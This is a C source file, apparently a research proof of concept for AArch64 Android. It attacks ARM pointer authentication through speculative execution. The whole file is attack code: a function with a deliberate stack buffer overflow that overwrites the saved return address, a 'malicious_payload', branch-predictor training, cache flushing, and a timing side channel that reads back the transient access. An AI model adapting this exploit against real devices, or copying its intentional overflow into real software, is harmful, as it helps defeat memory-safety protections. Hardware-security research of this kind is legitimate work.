#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <stdint.h>
#include <time.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <sys/ioctl.h>
// $NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android33-clang  -O2 -fPIE -pie -march=armv8.3-a+pauth -mbranch-protection=standard -o pacman pacman.c

// /home/hyj/android-ndk-r27c/toolchains/llvm/prebuilt/linux-x86_64/bin/llvm-objdump -d -S --arch=aarch64 pacman > pacman.S

#define CACHELINE 64
struct pmu_civac_req { uint64_t addr; uint64_t len; };
#define PMU_IOC_MAGIC 0xb1
#define PMU_IOC_DC_CIVAC _IOW(PMU_IOC_MAGIC, 0x1, struct pmu_civac_req)

static int pmu_fd = -1;

#ifndef MAP_ANON
#define MAP_ANON MAP_ANONYMOUS
#endif

/* PAC helpers: compiled only when pointer authentication is enabled. */
#if defined(__ARM_FEATURE_PAUTH)
#define PACIZA(x) __asm__ __volatile__("pacdza %0\n" : "+r"(x) :: "memory")
#define AUTIZA(x) __asm__ __volatile__("autdza %0\n" : "+r"(x) :: "memory")
#define XPACI(x) __asm__ __volatile__("xpaci %0\n" : "+r"(x) :: "memory")
#else
#define PACIZA(x) ((void)(x))
#define AUTIZA(x) ((void)(x))
#define XPACI(x) ((void)(x))
#warning "Building without pointer authentication; build with -march=armv9-a+pauth (or -march=armv8.3-a+pauth) to enable PAC."
#endif
#define BRANCH_PREDICTION_LOOP 10
#define TRANSIENT_ACCESS_PAGE 100
#define CACHE_LINE_SIZE 128
#define STRIDE 7
const char* safe_str = "0123456\0";
char *test_ptr = NULL;
static volatile uintptr_t saved_lr_pac = 0;
static volatile int saved_lr_once = 0;

typedef struct object{
    char buf[10];
    void (*fp)(void);
} object;
/* sweep large buffer to trash LLC (used as heuristic cache flush) */
static inline void trash_llc(uint8_t *buf, size_t sz){
    volatile uint8_t s = 0;
    for (size_t i=0; i<sz; i+=128) s ^= buf[i]; // 128B stride (M2 uses 128B line)
    asm volatile("" ::: "memory");
    (void)s;
}


static inline __attribute__((always_inline)) void cache_flush(volatile void *addr) {
    if (pmu_fd >= 0) {
        struct pmu_civac_req req = { .addr = (uint64_t)addr, .len = CACHELINE };
        ioctl(pmu_fd, PMU_IOC_DC_CIVAC, &req);
        printf("cache flush through kernel");
    } else {
        // Clean and invalidate data cache line by virtual address to PoC
        __asm__ __volatile__("dc civac, %0" :: "r"(addr) : "memory");
        __asm__ __volatile__("dsb ish" ::: "memory");
        __asm__ __volatile__("isb" ::: "memory");
    }
}

/* Fill the speculation window with a programmable number of ORR instructions. */
static inline void fill_speculation_window(int orr_count)
{
    if (orr_count <= 0) return;

    register uint64_t sink = 0;
    for (int i = 0; i < orr_count; ++i) {
        asm volatile("orr %0, %0, %0\n" : "+r"(sink));
    }
    (void)sink;
}


/* Best-effort CPU pinning on Linux/Android using sched_setaffinity. */
static void pin_to_core_android(int core) {
    if (core < 0 || core >= CPU_SETSIZE) return;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(core, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        perror("sched_setaffinity");
    }
}


static inline __attribute__((always_inline)) uint64_t rdtsc(void) {
    uint64_t cntvct, cntfrq;
    __asm__ __volatile__("isb");
    __asm__ __volatile__("mrs %0, cntvct_el0" : "=r"(cntvct));
    __asm__ __volatile__("mrs %0, cntfrq_el0" : "=r"(cntfrq));
    return (cntvct * 1000000000ull) / cntfrq; // ns
}

static inline void save_sp(){
    uintptr_t fp = 0;
        asm volatile("mov %0, x29" : "=r"(fp));
        saved_lr_pac = *(uintptr_t *)(fp + 8);
        saved_lr_once = 1;
} 

uint64_t saved_pac = 0;
int first_loop = 0;
__attribute__((noinline, optnone))
void vulnerable_function(void* probe, long pageSize, char *str, int is_transient,int spec_window_orrs){
    volatile char target_buffer[2];
    
    uintptr_t lr_raw, lr_x;
    uintptr_t fp, sp;
    asm volatile("mov %0, x29" : "=r"(fp));
    asm volatile("mov %0, sp" : "=r"(sp));
    
    asm volatile(
        "ldr %0, [x29, #8]\n"
        "mov %1, %0\n"
        "xpaci %1\n"
        : "=r"(lr_raw), "=r"(lr_x)
        :
        : "memory"
        );
   saved_pac = lr_raw ^ lr_x; 
    // printf("raw = 0x%lx\n", (unsigned long)lr_raw);
    // printf("xpaci = 0x%lx\n", (unsigned long)lr_x);
    // printf("pac_only = 0x%lx\n", (unsigned long)saved_pac);
    // printf("fp=0x%lx sp=0x%lx\n", (unsigned long)fp, (unsigned long)sp);

    const size_t max_copy = 64;
    size_t copy_len = sizeof(target_buffer);
    if (is_transient) {
        uintptr_t lr_addr = fp + 8;
        uintptr_t x29_addr = fp;
        uintptr_t saved_x29;
        asm volatile("ldr %0, [x29]\n" : "=r"(saved_x29) :: "memory");
        uintptr_t buf_addr = (uintptr_t)target_buffer;
        size_t lr_overwrite_off = (lr_addr > buf_addr) ? (size_t)(lr_addr - buf_addr) : (size_t)-1;
        size_t x29_overwrite_off = (x29_addr > buf_addr) ? (size_t)(x29_addr - buf_addr) : (size_t)-1;
        //uintptr_t lr_combined = lr_raw;
        uintptr_t lr_combined = lr_x;
        if (x29_overwrite_off != (size_t)-1 &&
            x29_overwrite_off + sizeof(saved_x29) <= max_copy) {
            memcpy(str + x29_overwrite_off, &saved_x29, sizeof(saved_x29));
            if (x29_overwrite_off + sizeof(saved_x29) > copy_len) {
                copy_len = x29_overwrite_off + sizeof(saved_x29);
            }
        }
        if (lr_overwrite_off != (size_t)-1 &&
            lr_overwrite_off + sizeof(lr_combined) <= max_copy) {
            memcpy(str + lr_overwrite_off, &lr_combined, sizeof(lr_combined));
            if (lr_overwrite_off + sizeof(lr_combined) > copy_len) {
                copy_len = lr_overwrite_off + sizeof(lr_combined);
            }
        }
    }
    uintptr_t v;
    memcpy(&v, str + 0x2a, sizeof(v));
    //printf("produced lr = 0x%lx\n", (unsigned long)v);
    /* BOF(overwrite return address) */
    if (!is_transient) {
        copy_len = sizeof(target_buffer);
    }
    memcpy((void*)target_buffer, str, copy_len);
   
    {
        uintptr_t lr_now;
        asm volatile("ldr %0, [x29, #8]\n" : "=r"(lr_now) :: "memory");
        //printf("saved LR before ret: 0x%lx\n", (unsigned long)lr_now);
    }
    asm volatile("" : : "r"(target_buffer) : "memory"); // escape
   
}

__attribute__((noinline))
void gadget(void* probe, long pageSize,  char * vuln_str, int is_transient,int spec_window_orrs){
    object* vuln_obj  = (object*)malloc(sizeof(object));
    void* pointer = probe + pageSize * is_transient * 2;

      /* SETUP */
    const size_t safe_len = 64;
    char *safe_str = (char *)malloc(safe_len);
    if (!safe_str) return;
    memset(safe_str, 0x41, safe_len);
    safe_str[safe_len - 1] = '\0';
   
    
    // safe BOF (will not be crashed)
    const size_t fp_offset = offsetof(object, fp);
    memcpy(safe_str + fp_offset, &vuln_obj->fp, sizeof(vuln_obj->fp));

    
    volatile int tmp_local = 0;
    
    /* flush "str"  */
    cache_flush((void*)vuln_str);
    
    asm volatile("dsb ish" ::: "memory");
    asm volatile("isb" ::: "memory");

    /* target branch training check */
    if(10 > strlen(vuln_str)){
    //if(1) {
        vulnerable_function(probe,pageSize, safe_str,is_transient, spec_window_orrs);
        //vulnerable_function(probe,pageSize, str,is_transient, spec_window_orrs);
        /* fill speculation window using ORR chains */
        fill_speculation_window(spec_window_orrs);

        
        /* is_transient deref  */   
       tmp_local ^= *(volatile int*)(pointer);
     
        
    } else {
        printf("is_transient\n");
    }

   
    return;
}



int main(int argc, char **argv) {
    int orr_count = 0;
    if (argc > 1) {
        char *end = NULL;
        errno = 0;
        long parsed = strtol(argv[1], &end, 10);
        if (errno != 0 || end == argv[1] || *end != '\0') {
            fprintf(stderr, "Invalid ORR count '%s'; falling back to 0\n", argv[1]);
        } else {
            if (parsed < 0) parsed = 0;
            if (parsed > 200) parsed = 200;
            orr_count = (int)parsed;
        }
    }

    /* pin to an arbitrary core tag (best-effort) */
    pin_to_core_android(7);

    const long pageSize = sysconf(_SC_PAGESIZE);

    void* probe = mmap(NULL, pageSize * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1,0);
    if (probe == MAP_FAILED) { perror("mmap"); return EXIT_FAILURE; }

    memset(probe, 0x10, 256 * pageSize);

    const size_t overflow_len = 64;
    const size_t payload_sz = ((overflow_len + 1 + pageSize - 1) / pageSize) * pageSize;
    unsigned char *malicious_payload = NULL;
    if (posix_memalign((void**)&malicious_payload, pageSize, payload_sz) != 0) {
        perror("posix_memalign malicious_payload");
        return EXIT_FAILURE;
    }
    
    memset(malicious_payload, 0, payload_sz);
    memset(malicious_payload, 0x41, overflow_len); // non-NUL payload for strlen
    malicious_payload[overflow_len] = '\0';

    void *malicious_ptr = (void*)((uintptr_t)probe + TRANSIENT_ACCESS_PAGE * pageSize);
    
    memcpy(malicious_payload + overflow_len + 1, &malicious_ptr, sizeof(malicious_ptr));
    test_ptr = (char*)malicious_payload;
    
    int is_transient = 0;
    uint64_t t1,t2;
    volatile int tmp = 0;

    asm volatile("dsb ish" ::: "memory");
    asm volatile("isb" ::: "memory");
    /* flush all probe pages (best-effort) via trashing) */
    for(int i = 0; i < pageSize * 256; i+= 64) cache_flush(probe + i);
    cache_flush(probe + TRANSIENT_ACCESS_PAGE * pageSize);
    
    
    for(int i = 0; i < 100000; i++){}
    
    const size_t trash_sz = 64UL<<20; // 64MiB
    uint8_t *trash;
    posix_memalign((void**)&trash, 128, trash_sz);
    trash_llc(trash, trash_sz); 
    
    asm volatile("dsb ish" ::: "memory");
    asm volatile("isb" ::: "memory");


    /* Branch training loop */
    const int spec_window_orrs = orr_count;
    
    for (int i = 0; i <= BRANCH_PREDICTION_LOOP; i++) {
        
        char *ptr = (i == BRANCH_PREDICTION_LOOP) ? test_ptr : safe_str;
        is_transient = TRANSIENT_ACCESS_PAGE * (i == BRANCH_PREDICTION_LOOP);
        
        asm volatile("dsb ish\n isb\n" ::: "memory");
        
        gadget(probe,pageSize,ptr,is_transient,spec_window_orrs);
    }
    
   
    asm volatile("dsb ish\n isb\n" ::: "memory");
    
    t1 = rdtsc();
    tmp ^= *(volatile int*)(probe + pageSize * TRANSIENT_ACCESS_PAGE * 2); // is_transient target
    t2 = rdtsc();
    printf("is_transient data access: %llu\n",(unsigned long long)(t2-t1));

    cache_flush(probe + pageSize * TRANSIENT_ACCESS_PAGE);

    t1 = rdtsc();
    tmp ^= *(volatile int*)(probe + pageSize * 50); // is_transient target
    t2 = rdtsc();
    printf("cache miss : %llu\n",(unsigned long long)(t2-t1));

    t1 = rdtsc();
    tmp ^= *(volatile int*)(probe + pageSize * 50); // is_transient target
    t2 = rdtsc();
    printf("cache hit : %llu\n",(unsigned long long)(t2-t1));

    munmap(probe, pageSize * 256);
   
    free(malicious_payload);

    return 0;
}
